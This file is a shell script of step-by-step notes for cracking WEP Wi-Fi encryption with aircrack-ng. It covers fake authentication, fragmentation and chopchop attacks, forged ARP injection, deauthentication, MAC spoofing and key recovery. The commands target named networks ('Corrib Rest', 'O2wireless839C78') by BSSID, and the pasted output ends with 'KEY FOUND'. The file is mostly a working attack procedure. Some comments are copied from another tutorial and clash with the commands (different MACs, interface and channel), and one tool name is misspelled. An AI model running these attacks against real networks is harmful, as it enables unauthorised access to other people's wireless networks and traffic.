#!/bin/sh

# 00:1F:33:F0:53:45  -89       17        0    0  11  54   WEP  WEP         Corrib Rest 

#--------------------------------------------------------------------------------------#

# put card into monitor mode on channel 11
airmon-ng start wlan0 11

# assocaite with AP
aireplay-ng -1 0 -e "Your Network" -a 00:1F:33:F0:53:45 -h 00:C0:CA:32:9C:F4 mon0

# -1 means fake authentication
# 0 reassociation timing in seconds
# -e teddy is the wireless network name
# -a 00:14:6C:7E:40:80 is the access point MAC address
# -h 00:09:5B:EC:EE:F2 is our card MAC address
# ath0 is the wireless interface name


# 18:18:20  Sending Authentication Request
# 18:18:20  Authentication successful
# 18:18:20  Sending Association Request
# 18:18:20  Association successful :-)

#--------------------------------------------------------------------------------------#

# fragmentation technique 

aireplay-ng -5 -b 00:1F:33:F0:53:45 -h 00:C0:CA:32:9C:F4 mon0

# -5 means the fragmentation attack
# -b 00:14:6C:7E:40:80 is the access point MAC address
# -h 00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication
# ath0 is the wireless interface name

#--------------------------------------------------------------------------------------#

# chop chop technique

aireplay-ng -4 -h 00:C0:CA:32:9C:F4 -b 00:1F:33:F0:53:45 -e "Corrib Rest" mon0

# -4 means the chopchop attack
# -h 00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication
# -b 00:14:6C:7E:40:80 is the access point MAC address
# ath0 is the wireless interface name

# check the decrypted packet with tcpdump
tcpdump -n -vvv -e -s0 -r replay_dec-0804-223241.cap

#--------------------------------------------------------------------------------------#

# Use packetforge-ng to create an arp packet

packetforge-ng -0 -a 00:1F:33:F0:53:45 -h 00:C0:CA:32:9C:F4 -k 255.255.255.255 -l 255.255.255.255 -y replay_dec-0804-223241.xor -w arp-request

# -0 means generate an arp packet
# -a 00:1F:33:F0:53:45 is the access point MAC address
# -h 00:C0:CA:32:9C:F4 is MAC address of our card
# -k 255.255.255.255 is the destination IP (most APs respond to 255.255.255.255)
# -l 255.255.255.255 is the source IP (most APs respond to 255.255.255.255)
# -y replay_dec-0804-223241.xor is file to read the PRGA from (NOTE: Change the file name to the actual file name out in step 4 above)
# -w arp-request is name of file to write the arp packet to

# The system will respond:
# Wrote packet to: arp-request

# After creating the packet, use tcpdump to review it from a sanity point of view.
tcpdump -n -vvv -e -s0 -r arp-request


#--------------------------------------------------------------------------------------#

# Open another console session to capture the generated IVs. Then enter:

# Start airodump-ng
airodump-ng -c 11 --bssid 00:1F:33:F0:53:45 -w capture mon0


# -c 9 is the channel for the wireless network
# --bssid 00:1F:33:F0:53:45 is the access point MAC address. This eliminate extraneous traffic.
# -w capture is file name prefix for the file which will contain the captured packets.
# mon0 is the interface name.


#--------------------------------------------------------------------------------------#


# Inject the arp packet
aireplay-ng -2 -r arp-request mon0


# -2 means use interactive frame selection
# -r arp-request defines the file name from which to read the arp packet
# mon0 defines the interface to use

#--------------------------------------------------------------------------------------#

# Run aircrack-ng to obtain the WEP key

aircrack-ng -b 00:1F:33:F0:53:45 capture*.cap 

# capture*.cap selects all dump files starting with “capture” and ending in “cap”.
# -b 00:14:6C:7E:40:80 selects the one access point we are interested in


#--------------------------------------------------------------------------------------#


aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b 00:1F:33:F0:53:45 -h 00:C0:CA:32:9C:F4 mon0


# -2 means use interactive frame selection
# -p 0841 sets the Frame Control Field such that the packet looks like it is being sent from a wireless client.
# -c FF:FF:FF:FF:FF:FF sets the destination MAC address to be a broadcast. This is required to cause the AP to replay the packet and thus getting the new IV.
# -b 00:14:6C:7E:40:80 is the access point MAC address
# -h 00:09:5B:EC:EE:F2 is the MAC address of our card and must match the MAC used in the fake authentication
# ath0 defines the interface to use


#--------------------------------------------------------------------------------------#

#
airmon-ng start wlan0 11

#
aireplay-ng -1 0 -e "Corrib Rest" -a 00:1F:33:F0:53:45 -h 00:C0:CA:32:9C:F4 mon0

#
airodump-ng -c 11 mon0

#
airodump-ng mon0 -c 11 --bssid 00:1F:33:F0:53:45 -w corrib

# 
aireplay-ng -3 -x 150 -b 00:1F:33:F0:53:45 -h 00:C0:CA:32:9C:F4 mon0

aireplay-ng -3 -x 150 -e "Corrib Rest" -h 00:C0:CA:32:9C:F4 mon0


#
airplay-ng -0 30 -a 00:09:5B:FF:4F:B6 -c 00:22:69:08:70:11 wlan0

aireplay-ng -5 -b 00:1F:33:F0:53:45 -e "Corrib Rest" -h 00:C0:CA:32:9C:F4 mon0


#--------------------------------------------------------------------------------------#

# stop monitor mode
airmon-ng stop mon0

# put wlano interface down
ifconfig wlan0 down

# change mac address
macchanger --mac 00:11:22:33:44:55 wlan0

# put network interface into monitor mode
airmon-ng start wlan0


# scan for networks
airodump-ng mon0 

# scan single bssid
airodump-ng mon0 -c 6 --bssid 00:1F:9F:8E:DE:C9 -w WEPCrackingDemo 

# fake autherntication with AP
aireplay-ng -1 0 -a 00:1F:9F:8E:DE:C9 -h 00:11:22:33:44:55 -e O2wireless839C78 mon0

#
aireplay-ng -3 -b 00:1F:9F:8E:DE:C9 -h 00:11:22:33:44:55 mon0

# run aircrack on .cap to crack wep
aircrack-ng -b 00:1F:9F:8E:DE:C9 WEPCrackingDemo*.cap

# Opening WEPCrackingDemo-01.cap
# Attack will be restarted every 5000 captured ivs.
# Starting PTW attack with 117690 ivs.
# KEY FOUND! [ 23:72:08:54:20 ] 
# Decrypted correctly: 100%
